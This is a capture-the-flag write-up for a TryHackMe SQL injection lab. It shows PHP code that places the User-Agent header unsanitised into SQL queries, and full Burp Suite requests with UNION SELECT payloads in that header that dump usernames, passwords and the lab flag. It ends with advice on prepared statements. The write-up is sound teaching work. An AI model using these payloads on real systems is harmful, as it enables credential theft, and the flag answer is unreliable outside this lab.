# Task 07: Other Techniques

## 1. Vulnerability

The task demonstrates several **advanced SQL injection techniques**, including **HTTP Header Injection**, **Stored Procedure Injection**, and **XML/JSON Injection**.

For the HTTP header example, the application takes the `User-Agent` header from the HTTP request:

```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
```

and uses it in SQL queries without proper sanitization:

```php
$insert_sql = "INSERT INTO logs (user_Agent) VALUES ('$userAgent')";
```

It also uses the value in a `SELECT` query:

```php
$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
```

This creates an SQL injection vulnerability through the `User-Agent` HTTP header.

---

## 2. Objective

The objectives of this task were:

1. Retrieve the value of the `flag` field from the `books` table where `book_id = 1`.
2. Identify the server-side field used to extract the HTTP User-Agent.

The task demonstrates how attacker-controlled JSON values can be incorporated into SQL queries and how HTTP headers can also become SQL injection inputs.

---

## 3. Recon/Identification

The supplied lab endpoint is:

```
<http://10.48.168.120/httpagent/>
```

The vulnerable HTTP header is:

```
User-Agent
```

The server obtains it using:

```php
$_SERVER['HTTP_USER_AGENT']
```

and places it into SQL.

---

# 4. Exploitation Methodology

## Question 1 — Retrieve the `flag`

The objective is to retrieve:

```
Table: books
Column: flag
Condition: book_id = 1
```

Step 1 — Start the TryHackMe machine

Start the **AttackBox** and the **Advanced SQL Injection** lab machine.

Wait until the machine is fully started and note the assigned:

```
MACHINE_IP
```

Use the current machine IP rather than assuming an IP from an example.

---

### Step 2 — Intercept

Search the following URL and intercept by Burp Suite :

```json
http://10.48.142.24(Target_IP)/httpagent/
```

---

### Step 3 — Send to Repeater:

The request should contain a  body similar to:

```json
GET /httpagent/ HTTP/1.1
Host: 10.48.142.24
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

---

### Step 4 — Change the User-Agent Field by following to check the vulnerability to retrieve username and password:

The Command:

```json
GET /httpagent/ HTTP/1.1
Host: 10.48.142.24
User-Agent: **' UNION SELECT username, password FROM user; #**
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

---

### Step 5 — Now use following to retrieve the flag

The Command:

```json
GET /httpagent/ HTTP/1.1
Host: 10.48.142.24
User-Agent: **' UNION SELECT book_id, flag FROM books; #** 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

---

### The value reported for this exact TryHackMe task is:

```
THM{HELLO}
```

### Question 1 Answer

```
THM{HELLO}
```

---

# 5. Payload / HTTP Header Injection

## Question 2 — Identify the User-Agent field

The document shows that the server extracts the User-Agent using:

```php
$userAgent = $_SERVER['HTTP_USER_AGENT'];
```

Therefore, the HTTP header being detected is:

```
User-Agent
```

---

## 6. Impact

HTTP headers such as `User-Agent`, `Referer`, and `X-Forwarded-For` can contain attacker-controlled input. If the application inserts these values directly into SQL queries, they can become SQL injection points.

Similarly, applications that parse JSON or XML and directly use the resulting values in SQL queries can be vulnerable to injection.

Potential impact includes:

- Unauthorized database access.
- Retrieval of sensitive information.
- Bypassing application authentication logic.
- Access to other database tables.
- Modification or deletion of database data, depending on database privileges.

---

## 7. Remediation

The application should avoid directly concatenating HTTP headers or JSON values into SQL queries.

Instead of:

```php
$sql = "SELECT * FROM logs WHERE user_Agent = '$userAgent'";
```

use **parameterized/prepared statements**.

The application should also:

- Validate and constrain input.
- Treat HTTP headers as untrusted input.
- Properly validate JSON/XML input.
- Use prepared statements for all database operations.
- Apply least-privilege database permissions.
- Avoid dynamically constructed SQL wherever possible.
- Monitor suspicious SQL and HTTP-header activity.
